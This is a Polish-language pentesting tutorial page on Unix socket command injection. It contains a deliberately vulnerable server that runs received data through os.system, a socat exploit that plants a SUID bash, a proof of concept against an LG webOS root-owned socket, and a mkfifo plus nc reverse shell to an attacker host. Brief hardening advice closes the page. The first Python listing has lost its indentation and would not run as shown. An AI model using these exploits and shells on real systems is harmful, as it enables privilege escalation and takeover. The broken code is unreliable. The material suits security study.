# Socket Command Injection

## Przykład wiązania socketu z użyciem Pythona

W poniższym przykładzie tworzony jest **unix socket** (`/tmp/socket_test.s`), a wszystko, co zostanie **odebrane**, zostanie **wykonane** przez `os.system`. Wiem, że raczej nie znajdziesz tego w środowisku produkcyjnym, ale celem tego przykładu jest pokazanie, jak wygląda kod korzystający z unix socketów oraz jak obsługiwać dane wejściowe w najgorszym możliwym przypadku.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Wykonaj** kod za pomocą python: `python s.py` i **sprawdź, jak socket nasłuchuje**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studium przypadku: eskalacja wywoływana sygnałem przez należący do root UNIX socket (LG webOS)

Niektóre uprzywilejowane daemony udostępniają należący do root UNIX socket, który akceptuje niezaufane dane wejściowe i wiąże uprzywilejowane działania z identyfikatorami wątków oraz sygnałami. Jeśli protokół pozwala nieuprzywilejowanemu klientowi wpływać na to, który natywny wątek zostanie wybrany, może być możliwe wywołanie uprzywilejowanej ścieżki kodu i eskalacja uprawnień.<sup>[[1]](#references)[[2]](#references)</sup>

Główny opis oraz disclosure przedstawiają następującą sekwencję.<sup>[[1]](#references)[[2]](#references)</sup>

Zaobserwowany schemat:
- Połącz się z należącym do root socketem (np. /tmp/remotelogger).
- Utwórz wątek i uzyskaj jego natywny identyfikator wątku (TID).
- Wyślij TID (spakowany) wraz z dopełnieniem jako żądanie; odbierz potwierdzenie.
- Dostarcz określony sygnał do tego TID, aby wywołać uprzywilejowane działanie.

Skrócony PoC poniżej odzwierciedla tę sekwencję.<sup>[[1]](#references)[[2]](#references)</sup>
Minimalny szkic PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Aby uzyskać root shell, można użyć prostego wzorca named-pipe + nc.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Ta klasa błędów wynika z ufania wartościom pochodzącym ze stanu klienta bez uprawnień (TIDs) i wiązania ich z uprzywilejowanymi handlerami sygnałów lub logiką.<sup>[[1]](#references)</sup>
- Wzmocnij zabezpieczenia, wymuszając uwierzytelnianie poświadczeń na socket, sprawdzając formaty wiadomości oraz oddzielając uprzywilejowane operacje od dostarczanych z zewnątrz identyfikatorów wątków.

## References

- [1] [Jailbreak webOS dla zabawy (tylko dla zabawy)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS TV: Path Traversal, obejście uwierzytelniania i pełne przejęcie urządzenia (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
